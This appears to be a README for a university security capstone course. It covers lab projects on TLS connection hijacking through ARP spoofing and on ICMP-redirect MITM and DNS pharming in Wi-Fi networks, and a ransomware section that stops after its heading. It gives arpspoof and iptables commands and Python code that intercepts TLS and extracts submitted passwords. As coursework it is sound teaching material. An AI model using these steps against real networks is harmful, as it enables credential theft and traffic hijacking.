# Computer Security Capstone Project

---

## 📌 Table of Contents

- [1. Project 1 - TLS Connection Hijacking](#project-1---tls-connection-hijacking)
- [2. Project 2 - MITM and Pharming Attacks in Wi-Fi Networks](#project-2---mitm-and-pharming-attacks-in-wi-fi-networks)
- [3. Project 3 - Ransomware Propagation and Payload](#project-3---ransomware-propagation-and-payload)
- [4. 測試與觀察結果](#4-測試與觀察結果)

---

## Project 1 - TLS Connection Hijacking

### GOAL
- Make use of arpspoofing to deceive router and victim
- Establish TLS connections between both attacker and victim, and attacker and web server
- Parsing HTML packets to ensure that the victim's browser displays the webpage properly.
- __Steal the password__ while victim is entering the login page

### STEP1 - ARP Spoofing
Make the __victim / router__ assume that the attacker is where the packet should go at next hop (originally the router / victim) by deceiving the arp packets.
```bash
sudo arpspoof -i <INTERFACE> -t <GATEWAY_IP> <CLIENT_IP>
sudo arpspoof -i <INTERFACE> -t <CLIENT_IP> <GATEWAY_IP>
```

### STEP2 - Hijacking a TLS Connection
Create a socket to make connection with victim, based on the previous ARP spoofing, the victim sends packets to the attacker. 
```python
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(5)

client_socket, addr = server.accept()
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile=certFile, keyfile=keyFile)
victim_connection = context.wrap_socket(client_socket, server_side=True)
```
Create connections between attacker and server, the server sends website information to router, and based on the previous ARP spoofing, the router will sends packets back to attacker, too.
```python
context = ssl.create_default_context()
server_connection = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=host)

server_connection.connect((host, port))
server_connection.sendall(request)
```

### STEP3 - Handle Large Packets
Normally, the size of a website is huge that one must handle packet several times. By parsing HTML header, coping with large packets will be much easier.
- HTML header format
  - "\r\n\r\n" at the end of header
  - every header is splited by "\r\n"
  - find __Content-Length__ and __Trandfer-Encoding__
- Content-Length
  - Recording the total size of the entire web page.
- Tansfer-Encoding
  - Sometimes, "Content-Length" won't be used instead of "Transfer-Encoding" since there might be a dynamic generated pages
  - If the tag is "Chunked", each chunk indicates its own length, and a final chunk with a length of 0 signals the end.
```text
4\r\n
Wiki\r\n
5\r\n
pedia\r\n
0\r\n
\r\n
```

### STEP4 - STEAL Password
- Find header named "Type", if the type of this request is post, check HTML body and the body format will be,
```text
username=<username>&password=<password>
```

---

## Project 2 - MITM and Pharming Attacks in Wi-Fi Networks

### GOAL
- Scan IP/MAC addresses of the devices in a Wi-Fi network
- Launch a man-in-the-middle (MITM) attack by using ICMP redirect
- Launch a pharming attack

### STEP1 - Device Address Information Collection
Collect devices information from arp table, and get ethernet ip address of the victim which is under same wifi network.
```cpp
// The required information can be found in /proc/net/arp
// code is in icmp_redirect.cpp
// example:
// IP address       HW type     Flags       HW address            Mask     Device
// 172.20.128.1     0x1         0x2         00:15:5d:86:1e:78     *        eth0
```

### STEP2 - ICMP redirect attack
Analyze an ICMP Redirect packet, craft a fake one, and send it to victim. Make the victim believe that sending packets to 8.8.8.8 via the attacker is a better route.

### STEP3 - DNS Spoofing
Intercept DNS request, analyze the information in the packet, discard it, and send a fake reply back to the victim.
- Intercepts DNS requests using NetfilterQueue
```bash
# Packets to port 53 will be sent to the NFQUEUE numbered 0
# which is configured to be intercepted and processed by our program using the Netfilter Queue (NFQ) library.
system("sudo iptables -F");
system("sudo iptables -A FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0");
```

---

## Project 3 - Ransomware Propagation and Payload

### GOAL
- 
